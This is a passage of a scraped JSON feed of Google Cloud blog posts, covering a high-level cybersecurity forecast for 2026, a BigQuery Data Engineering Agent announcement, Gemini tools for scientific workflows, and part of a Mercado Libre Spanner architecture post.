style=\"vertical-align: baseline;\"> with Siyuan Zhang (Google) at the Maintainer Summit</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://rsvp.withgoogle.com/events/google-cloud-at-kubecon-north-america-2025\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">GKE Upgrade: A New Era of Safety and Control</span></a><span style=\"vertical-align: baseline;\"> with Wenjia Zhang (Google) at booth #200</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">Get started</strong></h3>\n<p><span style=\"vertical-align: baseline;\">This is what it looks like when open-source innovation and managed-service excellence come together. This new, safer upgrade feature is coming soon in GKE 1.33. To learn more about managing your clusters, check out the </span><a href=\"https://docs.cloud.google.com/kubernetes-engine/upgrades\"><span style=\"text-decoration: underline; vertical-align: baseline;\">GKE documentation</span></a><span style=\"vertical-align: baseline;\">.</span></p></div>",
        "published_date": "2025-11-04 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/threat-intelligence/cybersecurity-forecast-2026/",
        "title": "Preparing for Threats to Come: Cybersecurity Forecast 2026",
        "thumbnail": null,
        "author": "Adam Greenberg",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Every November, we make it our mission to equip organizations with the knowledge needed to stay ahead of threats we anticipate in the coming year. The Cybersecurity Forecast 2026 report, released today, provides comprehensive insights to help security leaders and teams prepare for those challenges.</span></p>\n<p><span style=\"vertical-align: baseline;\">This report does not contain \"crystal ball\" predictions. Instead, our forecasts are built on real-world trends and data we are observing right now. The information contained in the report comes directly from Google Cloud security leaders, and dozens of experts, analysts, researchers, and responders directly on the frontlines.</span></p></div>\n<div class=\"block-aside\"><dl>\n    <dt>aside_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;title&#x27;, &#x27;Cybersecurity Forecast 2026&#x27;), (&#x27;body&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe16e7e4f40&gt;), (&#x27;btn_text&#x27;, &#x27;Download now&#x27;), (&#x27;href&#x27;, &#x27;https://cloud.google.com/security/resources/cybersecurity-forecast?&amp;utm_source=cgc-blog&amp;utm_medium=blog&amp;utm_campaign=FY25-Q4-GLOBAL-ENT37011-website-dl-cyber-forecast-124843&amp;utm_content=launch_blog&amp;utm_term=-&#x27;), (&#x27;image&#x27;, &lt;GAEImage: forecast 2026 cover&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Artificial Intelligence, Cybercrime, and Nation States</span></h3>\n<p><span style=\"vertical-align: baseline;\">Cybersecurity in the year ahead will be defined by rapid evolution and refinement by adversaries and defenders. Defenders will leverage artificial intelligence and agentic AI to protect against increasingly sophisticated and disruptive cybercrime operations, nation-state actors persisting on networks for long periods of time to conduct espionage and achieve other strategic goals, and adversaries who are also embracing artificial intelligence to scale and speed up attacks.</span></p>\n<h4><span style=\"vertical-align: baseline;\">AI Threats</span></h4>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>Adversaries Fully Embrace AI:</strong> We anticipate threat actors will move decisively from using AI as an exception to using it as the norm. They will leverage AI to enhance the speed, scope, and effectiveness of operations, streamlining and scaling attacks across the entire lifecycle.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>Prompt Injection Risks:</strong> A critical and growing threat is prompt injection, an attack that manipulates AI to bypass its security protocols and follow an attacker's hidden command. Expect a significant rise in targeted attacks on enterprise AI systems.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>AI-Enabled Social Engineering:</strong> Threat actors will accelerate the use of highly manipulative AI-enabled social engineering. This includes vishing (voice phishing) with AI-driven voice cloning to create hyperrealistic impersonations of executives or IT staff, making attacks harder to detect and defend against.</span></p>\n</li>\n</ul>\n<h4><span style=\"vertical-align: baseline;\">AI Advantages</span></h4>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>AI Agent Paradigm Shift:</strong> Widespread adoption of AI agents will create new security challenges, requiring organizations to develop new methodologies and tools to effectively map their new AI ecosystems. A key part of this will be the evolution of identity and access management (IAM) to treat AI agents as distinct digital actors with their own managed identities.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>Supercharged Security Analysts:</strong> AI adoption will transform security analysts\u2019 roles, shifting them from drowning in alerts to directing AI agents in an \u201cAgentic SOC.\u201d This will allow analysts to focus on strategic validation and high-level analysis, as AI handles data correlation, incident summaries, and threat intelligence drafting.</span></p>\n</li>\n</ul>\n<h4><span style=\"vertical-align: baseline;\">Cybercrime</span></h4>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>Ransomware and Extortion:</strong> The combination of ransomware, data theft, and multifaceted extortion will remain the most financially disruptive category of cybercrime. The volume of activity is escalating, with focus on targeting third-party providers and exploiting zero-day vulnerabilities for high-volume data exfiltration.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>The On-Chain Cybercrime Economy:</strong> As the financial sector increasingly adopts cryptocurrencies, threat actors are expected to migrate core components of their operations onto public blockchains for unprecedented resilience against traditional takedown efforts.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>Virtualization Infrastructure Under Threat:</strong> As security controls mature in guest operating systems, adversaries are pivoting to the underlying virtualization infrastructure, which is becoming a critical blind spot. A single compromise here can grant control over the entire digital estate and render hundreds of systems inoperable in a matter of hours.</span></p>\n</li>\n</ul>\n<h4><span style=\"vertical-align: baseline;\">Nation States</span></h4>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>Russia:</strong> Cyber operations are expected to undergo a strategic shift, prioritizing long-term global strategic goals and the development of advanced cyber capabilities over just tactical support for the conflict in Ukraine.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>China:</strong> The volume of China-nexus cyber operations is expected to continue surpassing that of other nations. They will prioritize stealthy operations, aggressively targeting edge devices and exploiting zero-day vulnerabilities.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>Iran:</strong> Driven by regional conflicts and the goal of regime stability, Iranian cyber activity will remain resilient, multifaceted, and semi-deniable, deliberately blurring the lines between espionage, disruption, and hacktivism.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\"><strong>North Korea:</strong> They will continue to conduct financial operations to generate revenue for the regime, cyber espionage against perceived adversaries, and seek to expand IT worker operations.</span></p>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\">Be Prepared for 2026</span></h3>\n<p><span style=\"vertical-align: baseline;\">Understanding threats is key to staying ahead of them. Read the <a href=\"https://cloud.google.com/security/resources/cybersecurity-forecast?&amp;utm_source=cgc-blog&amp;utm_medium=blog&amp;utm_campaign=FY25-Q4-GLOBAL-ENT37011-website-dl-cyber-forecast-124843&amp;utm_content=launch_blog&amp;utm_term=-\">full Cybersecurity Forecast 2026 report</a> for a more in-depth look at the threats covered in this blog post. We have also released special reports that dive into some of the threats and challenges unique to <a href=\"https://services.google.com/fh/files/misc/cybersecurity-forecast-2026-emea-en.pdf\" rel=\"noopener\" target=\"_blank\">EMEA</a> and <a href=\"https://services.google.com/fh/files/misc/cybersecurity-forecast-2026-japac-en.pdf\" rel=\"noopener\" target=\"_blank\">JAPAC</a> organizations.</span></p>\n<p><span style=\"vertical-align: baseline;\">For an even deeper look at the threat landscape next year, register for our <a href=\"https://www.brighttalk.com/webcast/18282/654496?&amp;utm_source=cgc-blog&amp;utm_medium=blog&amp;utm_campaign=FY25-Q4-global-ENT37011-onlineevent-er-dgcsm-Cybersecurity-Forecast-2026&amp;utm_content=launch_blog&amp;utm_term=-\" rel=\"noopener\" target=\"_blank\">Cybersecurity Forecast 2026 webinar</a>, which will be hosted once again by threat expert Andrew Kopcienski.</span></p></div>",
        "published_date": "2025-11-04 14:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/data-analytics/exploring-the-data-engineering-agent-in-bigquery/",
        "title": "The Data Engineering Agent is now in preview",
        "thumbnail": null,
        "author": "Varun Chandra",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Data is the lifeblood of the modern enterprise, but the process of making it useful is often fraught with friction. Data engineers, analysts, and scientists\u2014some of the most skilled and valuable talent in any organization\u2014are spending a disproportionate amount of their time on repetitive, low-impact tasks. What if you could shift your focus from manually building and maintaining pipelines to defining the best practices and rules that automate them?</span></p>\n<p><span style=\"vertical-align: baseline;\">Today, we\u2019re announcing a fundamental shift to solve this challenge. We're excited to announce the preview of the </span><strong style=\"vertical-align: baseline;\">Data Engineering Agent in BigQuery</strong><span style=\"vertical-align: baseline;\">, a first-party agent designed to automate the most complex and time-consuming data engineering tasks, powered by Gemini.</span></p>\n<p><span style=\"vertical-align: baseline;\">The Data Engineering Agent isn't just an incremental improvement; it's fundamentally transforming the way we work, with truly autonomous data engineering operations. According to IDC, \u2018</span><span style=\"font-style: italic; vertical-align: baseline;\">GenAI and other automation solutions will drive over $1 trillion in productivity gains for companies by 2026</span><span style=\"vertical-align: baseline;\">\u2019<sup>1</sup></span><span style=\"font-style: italic; vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">Here is a closer look at the powerful capabilities you can access today:</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Pipeline development and maintenance</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The Data Engineering Agent makes it easy to build and maintain robust data pipelines. The agent is available in </span><a href=\"https://cloud.google.com/bigquery/docs/pipelines-introduction\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BigQuery pipelines</span></a><span style=\"vertical-align: baseline;\"> and it can help you with:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Natural language pipeline creation:</strong><span style=\"vertical-align: baseline;\"> Describe your pipeline requirements in plain language, and the agent generates the necessary SQL code, adhering to data engineering best practices that you can customize through instruction files. For example: \"</span><span style=\"font-style: italic; vertical-align: baseline;\">Create a pipeline to load data from the 'customer_orders' bucket, standardize the date formats, remove duplicate entries, and load it into a BigQuery table named 'clean_orders'</span><span style=\"vertical-align: baseline;\">.\u201d</span></p>\n</li>\n</ul>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Intelligent pipeline modification:</strong><span style=\"vertical-align: baseline;\"> Need to update an existing pipeline? Just tell the agent what you want to change. It analyzes the existing code, and proposes the necessary modifications, leaving you to simply review and approve the changes. For example, you can ask it to \"</span><span style=\"font-style: italic; vertical-align: baseline;\">Create a pipeline to load data from the 'customer_orders' bucket, standardize the date formats, remove duplicate entries, and load it into a BigQuery table named 'clean_orders'.</span><span style=\"vertical-align: baseline;\">\" The agent follows best-practice design principles and helps you optimize and redesign your existing pipelines to eliminate redundant operations, as well as to leverage BigQuery's query optimization features such as partitioning.</span></p>\n</li>\n</ul>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/dataplex/docs/introduction\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Dataplex Universal Catalog</strong></a><strong style=\"vertical-align: baseline;\"> integration:</strong><span style=\"vertical-align: baseline;\"> The agent leverages Google Cloud\u2019s Dataplex data governance offering. It automatically retrieves additional resource metadata such as business glossaries and data profiles from Dataplex to improve the relevance, table-metadata generation (new tables) and performance of the generated pipelines. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Custom agent instructions and logic:</strong><span style=\"vertical-align: baseline;\"> Incorporate your unique business logic and engineering best practices by providing custom instructions and leveraging User-Defined Functions (UDFs) within the pipeline.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Automated code documentation:</strong><span style=\"vertical-align: baseline;\"> The agent automatically generates clear and concise documentation for your pipelines along with column descriptions, making them easier to understand and maintain for the entire team.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Spanish-language news and entertainment group PRISA Media and early access customer has had a positive experience with the Data Engineering Agent.\u00a0</span></p>\n<p style=\"padding-left: 40px;\"><span style=\"vertical-align: baseline;\">\u201c</span><span style=\"font-style: italic; vertical-align: baseline;\">The agent provides solutions that enable us to explore new development approaches, showing strong potential to address complex data engineering tasks. It demonstrates an impressive ability to correctly interpret our requirements, even for sophisticated data modeling tasks like creating SCD Type 2 dimensions. In its current state, it already delivers value in automating maintenance and small optimizations, and we believe it has the foundation to become a truly distinctive tool in the future.</span><span style=\"vertical-align: baseline;\">\u201d - Fernando Calo, Lead Data Engineer at the Spanish-language news and entertainment group PRISA</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Data preparation, transformation and modeling</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The first step in any data project is often the most time-consuming: understanding, preparing, and cleaning raw data. The Data Engineering Agent allows you, for example, to access raw files from Google Cloud Storage. It automatically cleans, deduplicates, formats and standardizes your data based on the provided instructions. Integration with Dataplex allows you to generate data quality assertions based on rules defined in the Dataplex repository and automatically encrypt columns that were flagged as containing Personally Identifiable Information (PII). No more writing complex queries to identify data quality issues or to standardize formats.</span></p>\n<p><span style=\"vertical-align: baseline;\">The agent can then generate the necessary code to perform essential data transformation tasks, significantly reducing the time it takes to get your data ready for analysis. This process covers operations like joining and aggregating datasets.</span></p>\n<p><span style=\"vertical-align: baseline;\">The agent assists with complex data modeling, too. You can use natural language prompts to generate sophisticated schemas, such as Data Vault or Star Schemas, directly from your source tables.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1 - CleanPrepare\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/1_-_CleanPrepare.gif\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Pipeline troubleshooting</strong></h3>\n<p><span style=\"vertical-align: baseline;\">When issues arise, the Data Engineering Agent can help you quickly identify and resolve them. Instead of manually digging through logs and code, you invoke the agent to diagnose the problem. The Data Engineering Agent is integrated with </span><a href=\"https://cloud.google.com/products/gemini/cloud-assist\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini Cloud Assist</span></a><span style=\"vertical-align: baseline;\">. It analyzes the execution logs, identifies the root cause of the failure, and suggests a solution, helping you get your pipelines back up and running in record time.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"2 - troubleshoot (1)\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/2_-_troubleshoot_1.gif\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Pipeline migrations</strong></h3>\n<p><span style=\"vertical-align: baseline;\">For teams looking to modernize their data stack, the Data Engineering Agent can speed up the transition to a unified Google Cloud data platform. That\u2019s what happened at Vodafone as it migrated to BigQuery.\u00a0</span></p>\n<p style=\"padding-left: 40px;\"><span style=\"vertical-align: baseline;\">\u201c</span><span style=\"font-style: italic; vertical-align: baseline;\">During the migration journey to a Dataform environment, the Data Engineer Agent successfully replicated all existing data and transformations scripts with 100% automation and zero manual intervention. This achievement resulted in a </span><strong style=\"font-style: italic; vertical-align: baseline;\">90% reduction</strong><span style=\"font-style: italic; vertical-align: baseline;\"> in the time typically required for manual ETL migration, significantly accelerating the transition.</span><span style=\"vertical-align: baseline;\">\" - Chris Benfield, Head of Engineering, Vodafone</span></p>\n<p><span style=\"vertical-align: baseline;\">Customers have already migrated onto BigQuery pipelines to:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Standardize and unify code:</strong><span style=\"vertical-align: baseline;\"> If you're looking to consolidate your processing engines, the agent helps you to standardize on BigQuery pipelines. Simply provide the agent with your existing code, and it will generate the equivalent, optimized BigQuery pipeline, reducing operational complexity and cost.</span></p>\n</li>\n</ul>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Migrate from legacy tools:</strong><span style=\"vertical-align: baseline;\"> The agent can translate proprietary formats and configurations from legacy data processing tools into native BigQuery pipelines.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">The road ahead</strong></h3>\n<p><span style=\"vertical-align: baseline;\">This is just the beginning for the Data Engineering Agent. We are continuously working to expand its capabilities to address more challenges faced by data engineering teams. In the future, you can expect to see the agent extend its reach to include proactive troubleshooting, IDE integration, and pipeline orchestration in Cloud Composer.\u00a0</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Get started today</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The BigQuery Data Engineering Agent is available now. We are excited to see how you integrate this new intelligent partner into your daily work.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Ready to transform your data engineering workflows?</strong></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Access the agent:</strong><span style=\"vertical-align: baseline;\"> Navigate to BigQuery Pipelines in BigQuery Studio or the Dataform UI. The Data Engineering Agent is accessible via the \u2018Ask Agent\u2019 button.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Learn more:</strong><span style=\"vertical-align: baseline;\"> Review the </span><a href=\"https://docs.cloud.google.com/bigquery/docs/data-engineering-agent-pipelines\"><span style=\"text-decoration: underline; vertical-align: baseline;\">official documentation</span></a><span style=\"vertical-align: baseline;\"> for setup instructions and best practices.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Feedback:</strong><span style=\"vertical-align: baseline;\"> Email us at </span><a href=\"mailto:bigquery-dea-feedback@google.com\"><span style=\"text-decoration: underline; vertical-align: baseline;\">bigquery-dea-feedback@google.com</span></a></p>\n</li>\n</ol>\n<hr />\n<p><sup><em>1. IDC Market Perspective, GenAI's Impact on Enterprise Software, #US52547624, September 2024</em></sup></p></div>",
        "published_date": "2025-11-03 18:30:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/ai-machine-learning/how-scientists-can-use-gemini-enterprise-for-ai-workflows/",
        "title": "How scientists can leverage AI agents using Gemini Enterprise, Gemini Code Assist, and Gemini CLI",
        "thumbnail": null,
        "author": "Jay Boisseau",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Scientific inquiry has always been a journey of curiosity, meticulous effort, and groundbreaking discoveries. Today, that journey is being redefined, fueled by the incredible capabilities of AI. It\u2019s moving beyond simply processing data to actively participating in every stage of discovery, and Google Cloud is at the forefront of this transformation, building the tools and platforms that make it possible.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">The sheer volume of data generated by modern research is immense, often too vast for human analysis alone. This is where AI steps in, not just as a tool, but as a collaborative force. We\u2019re seeing powerful new models and AI agents assist with everything from identifying relevant literature and generating novel hypotheses to designing experiments, running simulations, and making sense of complex results. This collaboration doesn\u2019t replace human intellect; it amplifies it, allowing researchers to explore more avenues, more quickly, and with greater precision.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">At Google Cloud, we\u2019re bringing together high-performance computing (HPC) and advanced AI on a single, integrated platform. This means you can seamlessly move from running massive-scale simulations to applying sophisticated machine learning models, all in one environment.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">So, how can you leverage these capabilities to get to insights faster? The journey begins at the foundation of scientific inquiry: the hypothesis.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">AI-enhanced scientific inquiry</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Every great discovery starts with a powerful hypothesis. With millions of research papers published annually, identifying novel opportunities is a monumental task. To overcome this information overload, scientists can now turn to AI as a powerful research partner.</span></p>\n<p><span style=\"vertical-align: baseline;\">Our </span><a href=\"https://cloud.google.com/agentspace/docs/research-assistant\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Deep Research</span></a><span style=\"vertical-align: baseline;\"> agent tackles the first step: performing a comprehensive analysis of published literature to produce detailed reports on a given topic that would otherwise take months to compile. Building on that foundation, our </span><a href=\"https://cloud.google.com/agentspace/docs/idea-generation\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Idea Generation agent</span></a><span style=\"vertical-align: baseline;\"> then deploys an ensemble of AI collaborators to brainstorm, evaluate, propose, debate, and rank novel hypotheses. This powerful combination, available in </span><a href=\"https://cloud.google.com/gemini-enterprise?_gl=1*9qpvwe*_up*MQ..&amp;gclid=EAIaIQobChMIptGF-7qrkAMVRyvUAR0VwSw1EAAYASAAEgIZMPD_BwE&amp;gclsrc=aw.ds#module-7\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini Enterprise</span></a><span style=\"vertical-align: baseline;\">, transforms the initial phase of scientific inquiry, empowering researchers to augment their expertise and find connections they might otherwise miss.</span></p>\n<p><strong style=\"vertical-align: baseline;\">Go from hypothesis to results, faster</strong></p>\n<p><span style=\"vertical-align: baseline;\">Once a hypothesis is formed, the work of translating it into executable code begins. This is where AI coding assistants, such as </span><a href=\"https://codeassist.google/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini Code Assist</span></a><span style=\"vertical-align: baseline;\">, excel. They automate the tedious tasks of writing analysis scripts and simulation models by generating code from natural language and providing real-time suggestions, dramatically speeding up the core development process.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">But modern research is more than just a single script; it\u2019s a complete workflow of data, environments, and results managed from the command line. For this, </span><a href=\"https://cloud.google.com/gemini/docs/codeassist/gemini-cli\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini CLI</span></a><span style=\"vertical-align: baseline;\"> brings that same conversational power directly to your terminal. It acts as the ultimate workflow accelerator, allowing you to instantly synthesize research and generate hypotheses with simple commands, then seamlessly transition to experimentation by generating sophisticated analysis scripts, and debugging errors on the fly, all without ever breaking your focus. Gemini CLI can further accelerate your path to impact by transforming raw results into publication-ready text, generating the code for figures and tables, and refining your work for submission.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">This capability extends to automating the entire research environment. Beyond single commands, Gemini CLI can manage complex, multi-step processes like cloning a scientific application, installing its dependencies, and then building and testing it\u2014all with a simple prompt, maximizing your productivity.</span></p>\n<p><strong style=\"vertical-align: baseline;\">The new era of discovery: Your expertise, AI agents, and Google Cloud</strong></p>\n<p><span style=\"vertical-align: baseline;\">The new era of scientific discovery is here. By embedding AI into every stage of the scientific process - from sparking the initial idea to accelerating the final analysis - Google Cloud provides a single, unified platform for discovery. This new era of AI-enhanced scientific inquiry is built on a robust, intelligent infrastructure that combines the strengths of HPC simulation and AI. This includes purpose-built solutions like our H4D VMs optimized for scientific simulations, alongside the latest A4 and A4X VMs, powered by the latest NVIDIA GPUs, and Google Cloud Managed Lustre, a parallel file system that eliminates storage bottlenecks and allows your HPC and AI workloads to create and analyze massive datasets simultaneously. We provide the power to streamline the entire process so you can focus on scientific creativity - and changing the world!\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">Join the </span><a href=\"https://sites.google.com/view/advancedcomputingcommunity/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Advanced Computing Community</span></a><span style=\"vertical-align: baseline;\"> to connect with other researchers, share best practices, and stay up to date on the latest advancements in AI for scientific and technical computing, or </span><a href=\"https://cloud.google.com/contact\"><span style=\"text-decoration: underline; vertical-align: baseline;\">contact sales</span></a><span style=\"vertical-align: baseline;\"> to get started today. </span></p></div>",
        "published_date": "2025-11-03 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/retail/inside-mercado-libres-multi-faceted-spanner-foundation-for-scale-and-ai/",
        "title": "Inside Mercado Libre's multi-faceted Spanner architecture",
        "thumbnail": null,
        "author": "Pablo Leopoldo Arrojo",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><a href=\"https://mercadolibre.com/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Mercado Libre</span></a><span style=\"vertical-align: baseline;\">, the e-commerce and fintech pioneer of Latin America, operates at a staggering scale, demanding an infrastructure that's not just resilient and scalable, but also a catalyst for rapid innovation. While our use of </span><a href=\"https://cloud.google.com/spanner\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Spanner</span></a><span style=\"vertical-align: baseline;\"> for foundational consistency and scale is known, a deeper dive reveals a sophisticated, multi-layered strategy. Spanner is not just a database here; it's a core engine powering our internal developer platform, diverse data models, advanced analytics loops, intelligent features, and even our roadmap for next-generation AI applications.</span></p>\n<p><span style=\"vertical-align: baseline;\">This blog explores the technical underpinnings of how Mercado Libre leverages Spanner in concert with our internal innovations like the Fury platform, achieving significant business impact and charting a course for an AI-driven future.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">The dual challenge: internet-scale operations and developer velocity</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Mercado Libre faces the classic challenges of internet-scale services: keeping millions of daily financial transactions safe, making it easy for developers to build apps, and maintaining near-perfect uptime. The solution required a database powerful enough for the core and an abstraction layer elegant enough for broad developer adoption.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Fury: Mercado Libre's developer gateway</strong></h3>\n<p><span style=\"vertical-align: baseline;\">At the heart of Mercado Libre's strategy is </span><strong style=\"vertical-align: baseline;\">Fury</strong><span style=\"vertical-align: baseline;\">, our in-house middleware platform. Fury is designed to abstract away the complexities of various backend technologies, providing developers with standardized, simplified interfaces to build applications.\u00a0</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Abstraction &amp; Standardization:</strong><span style=\"vertical-align: baseline;\"> Fury allows development teams to focus on business logic rather than the nuances of distributed database management, schema design for specific engines, or optimal connection pooling.</span></p>\n</li>\n<li><strong style=\"vertical-align: baseline;\">Spanner as the Reliable Core:</strong><span style=\"vertical-align: baseline;\"> Spanner is an a</span><span style=\"vertical-align: baseline;\">lways-on, globally consistent, multi-model database with virtually unlimited scale.</span><span style=\"font-style: italic; vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">By designating Spanner as a choice within Fury, Mercado Libre ensures that applications built on the platform using Spanner\u00a0 inherit its best features \u2013 they stay consistent globally, scale without breaking, and rarely go down.</span></li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1_Rd8yefF.max-1000x1000.jpg\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Fig. 1 - Fury\u2019s core services</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Spanner \u2013 the versatile backbone</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Through Fury, Spanner empowers Mercado Libre's developers with remarkable versatility. Some apps need complex transactions, others need fast lookups. Spanner handles both, which means teams can use just one system:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Relational prowess for complex transactions:</strong><span style=\"vertical-align: baseline;\"> For sophisticated transactional workloads like order management, payments, and inventory systems, Spanner\u2019s relational capabilities (SQL, ACID transactions, joins) remain critical.\u00a0</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">High-performance key-value store:</strong><span style=\"vertical-align: baseline;\"> Many modern applications require fast point lookups and simple data structures. </span><span style=\"vertical-align: baseline;\">While Spanner isn't Mercado Libre's default backend for typical key-value workloads, there are specific applications running large scale </span><span style=\"vertical-align: baseline;\">non-relational, KV-style workloads</span><span style=\"vertical-align: baseline;\"> on the Spanner.</span></p>\n</li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">Spanner\u2019s foundational architecture \u2014 TrueTime for global consistency and automated sharding for effortless scaling \u2014 makes it an ideal candidate to reliably serve both these access patterns through the Fury platform.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Handling peak demand</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Mercado Libre's Spanner instances demonstrate significant processing capacity, handling around </span><strong style=\"vertical-align: baseline;\">214K </strong><span 